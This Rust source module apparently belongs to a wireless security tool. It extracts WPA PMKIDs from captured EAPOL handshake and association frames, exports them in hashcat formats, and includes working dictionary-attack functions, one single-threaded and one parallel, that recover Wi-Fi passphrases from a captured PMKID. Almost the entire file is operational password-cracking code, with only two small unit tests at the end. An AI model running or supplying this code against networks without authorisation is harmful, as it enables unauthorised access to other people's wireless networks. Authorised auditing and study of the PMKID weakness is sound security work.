//! PMKID extraction and attack support
//!
//! Extract PMKID from association/EAPOL for clientless attacks.


use crate::scanner::wireless_native::types::PmkidData;

/// PMKID extractor
pub struct PmkidExtractor {
    /// Collected PMKIDs
    pmkids: Vec<PmkidData>,
}

impl PmkidExtractor {
    /// Create new PMKID extractor
    pub fn new() -> Self {
        Self {
            pmkids: Vec::new(),
        }
    }

    /// Extract PMKID from EAPOL Message 1 key data
    pub fn extract_from_eapol(&mut self, bssid: &str, client_mac: &str, ssid: &str,
                              key_data: &[u8]) -> Option<PmkidData> {
        // PMKID is in RSN Key Data with tag 0xDD (vendor specific)
        // OUI: 00-0F-AC, Type: 4 (PMKID)

        let pmkid = parse_pmkid_from_key_data(key_data)?;

        let data = PmkidData {
            pmkid: pmkid.to_vec(),
            bssid: bssid.to_string(),
            client_mac: client_mac.to_string(),
            ssid: ssid.to_string(),
            captured_at: chrono::Utc::now(),
        };

        // Avoid duplicates
        if !self.pmkids.iter().any(|p| p.pmkid == data.pmkid) {
            self.pmkids.push(data.clone());
        }

        Some(data)
    }

    /// Extract PMKID from association response RSN IE
    pub fn extract_from_assoc_response(&mut self, bssid: &str, client_mac: &str,
                                       ssid: &str, rsn_ie: &[u8]) -> Option<PmkidData> {
        // PMKID can also appear in Association Response RSN IE
        let pmkid = parse_pmkid_from_rsn(rsn_ie)?;

        let data = PmkidData {
            pmkid: pmkid.to_vec(),
            bssid: bssid.to_string(),
            client_mac: client_mac.to_string(),
            ssid: ssid.to_string(),
            captured_at: chrono::Utc::now(),
        };

        if !self.pmkids.iter().any(|p| p.pmkid == data.pmkid) {
            self.pmkids.push(data.clone());
        }

        Some(data)
    }

    /// Get all collected PMKIDs
    pub fn get_pmkids(&self) -> &[PmkidData] {
        &self.pmkids
    }

    /// Clear collected PMKIDs
    pub fn clear(&mut self) {
        self.pmkids.clear();
    }
}

impl Default for PmkidExtractor {
    fn default() -> Self {
        Self::new()
    }
}

/// Parse PMKID from EAPOL Key Data
fn parse_pmkid_from_key_data(key_data: &[u8]) -> Option<&[u8]> {
    // Key Data contains KDEs (Key Data Encapsulations)
    // Format: Type (1) | Length (1) | OUI (3) | Data Type (1) | Data

    let mut pos = 0;

    while pos + 2 <= key_data.len() {
        let kde_type = key_data[pos];
        let kde_len = key_data[pos + 1] as usize;

        if pos + 2 + kde_len > key_data.len() {
            break;
        }

        // Vendor specific KDE (0xDD)
        if kde_type == 0xDD && kde_len >= 20 {
            let oui = &key_data[pos + 2..pos + 5];
            let data_type = key_data[pos + 5];

            // IEEE OUI (00:0F:AC) and PMKID type (4)
            if oui == [0x00, 0x0F, 0xAC] && data_type == 4 {
                // PMKID is 16 bytes
                return Some(&key_data[pos + 6..pos + 6 + 16]);
            }
        }

        pos += 2 + kde_len;
    }

    None
}

/// Parse PMKID from RSN IE
fn parse_pmkid_from_rsn(rsn_ie: &[u8]) -> Option<&[u8]> {
    if rsn_ie.len() < 24 {
        return None;
    }

    let mut pos = 0;

    // Skip version (2 bytes)
    pos += 2;

    // Skip group cipher (4 bytes)
    pos += 4;

    // Pairwise cipher count
    if pos + 2 > rsn_ie.len() {
        return None;
    }
    let pairwise_count = u16::from_le_bytes([rsn_ie[pos], rsn_ie[pos + 1]]) as usize;
    pos += 2 + (pairwise_count * 4);

    // AKM count
    if pos + 2 > rsn_ie.len() {
        return None;
    }
    let akm_count = u16::from_le_bytes([rsn_ie[pos], rsn_ie[pos + 1]]) as usize;
    pos += 2 + (akm_count * 4);

    // RSN capabilities (2 bytes)
    if pos + 2 > rsn_ie.len() {
        return None;
    }
    pos += 2;

    // PMKID count
    if pos + 2 > rsn_ie.len() {
        return None;
    }
    let pmkid_count = u16::from_le_bytes([rsn_ie[pos], rsn_ie[pos + 1]]) as usize;
    pos += 2;

    if pmkid_count > 0 && pos + 16 <= rsn_ie.len() {
        return Some(&rsn_ie[pos..pos + 16]);
    }

    None
}

/// Verify PMKID against a candidate passphrase
pub fn verify_pmkid(pmkid_data: &PmkidData, passphrase: &str) -> bool {
    use hmac::{Hmac, Mac};
    use sha1::Sha1;

    // Calculate PMK from passphrase
    let pmk = super::capture::calculate_pmk(passphrase, &pmkid_data.ssid);

    // Parse MAC addresses
    let ap_mac = match parse_mac(&pmkid_data.bssid) {
        Some(m) => m,
        None => return false,
    };

    let client_mac = match parse_mac(&pmkid_data.client_mac) {
        Some(m) => m,
        None => return false,
    };

    // Calculate expected PMKID
    // PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_STA)
    let mut data = Vec::with_capacity(20);
    data.extend_from_slice(b"PMK Name");
    data.extend_from_slice(&ap_mac);
    data.extend_from_slice(&client_mac);

    type HmacSha1 = Hmac<Sha1>;
    let mut mac = HmacSha1::new_from_slice(&pmk).unwrap();
    mac.update(&data);
    let result = mac.finalize().into_bytes();

    // PMKID is first 16 bytes
    let calculated_pmkid = &result[..16];

    calculated_pmkid == pmkid_data.pmkid.as_slice()
}

/// Export PMKIDs to hashcat format (22000)
pub fn export_pmkids_hashcat(pmkids: &[PmkidData]) -> Vec<String> {
    pmkids.iter()
        .map(|p| p.to_hashcat_format())
        .collect()
}

/// Export PMKIDs to pcap-like format for hashcat-utils
pub fn export_pmkids_16800(pmkids: &[PmkidData]) -> Vec<String> {
    // Format: PMKID*MAC_AP*MAC_STA*ESSID_HEX
    pmkids.iter()
        .map(|p| {
            let pmkid_hex = hex::encode(&p.pmkid);
            let ap_mac = p.bssid.replace(":", "").to_lowercase();
            let sta_mac = p.client_mac.replace(":", "").to_lowercase();
            let essid_hex = hex::encode(&p.ssid);

            format!("{}*{}*{}*{}", pmkid_hex, ap_mac, sta_mac, essid_hex)
        })
        .collect()
}

/// Parse MAC address string to bytes
fn parse_mac(mac: &str) -> Option<[u8; 6]> {
    let parts: Vec<&str> = mac.split(|c| c == ':' || c == '-').collect();
    if parts.len() != 6 {
        return None;
    }

    let mut bytes = [0u8; 6];
    for (i, part) in parts.iter().enumerate() {
        bytes[i] = u8::from_str_radix(part, 16).ok()?;
    }

    Some(bytes)
}

/// Crack PMKID using wordlist
pub fn crack_pmkid(pmkid_data: &PmkidData, wordlist: &[String]) -> Option<String> {
    for password in wordlist {
        if verify_pmkid(pmkid_data, password) {
            return Some(password.clone());
        }
    }
    None
}

/// Parallel PMKID cracking
pub fn crack_pmkid_parallel(pmkid_data: &PmkidData, wordlist: &[String],
                            num_threads: usize) -> Option<String> {
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc;

    let found = Arc::new(AtomicBool::new(false));
    let result = Arc::new(std::sync::Mutex::new(None));

    let chunk_size = (wordlist.len() + num_threads - 1) / num_threads;

    std::thread::scope(|s| {
        for chunk in wordlist.chunks(chunk_size) {
            let found = found.clone();
            let result = result.clone();
            let pmkid_data = pmkid_data.clone();

            s.spawn(move || {
                for password in chunk {
                    if found.load(Ordering::Relaxed) {
                        break;
                    }

                    if verify_pmkid(&pmkid_data, password) {
                        found.store(true, Ordering::Relaxed);
                        *result.lock().unwrap() = Some(password.clone());
                        break;
                    }
                }
            });
        }
    });

    Arc::try_unwrap(result).ok().and_then(|m| m.into_inner().ok()).flatten()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pmkid_format() {
        let pmkid = PmkidData {
            pmkid: vec![0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
                        0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10],
            bssid: "00:11:22:33:44:55".to_string(),
            client_mac: "66:77:88:99:aa:bb".to_string(),
            ssid: "TestSSID".to_string(),
            captured_at: chrono::Utc::now(),
        };

        let formatted = pmkid.to_hashcat_format();
        assert!(formatted.starts_with("WPA*02*"));
        assert!(formatted.contains("0102030405060708090a0b0c0d0e0f10"));
    }

    #[test]
    fn test_parse_mac() {
        let mac = parse_mac("00:11:22:33:44:55").unwrap();
        assert_eq!(mac, [0x00, 0x11, 0x22, 0x33, 0x44, 0x55]);
    }
}
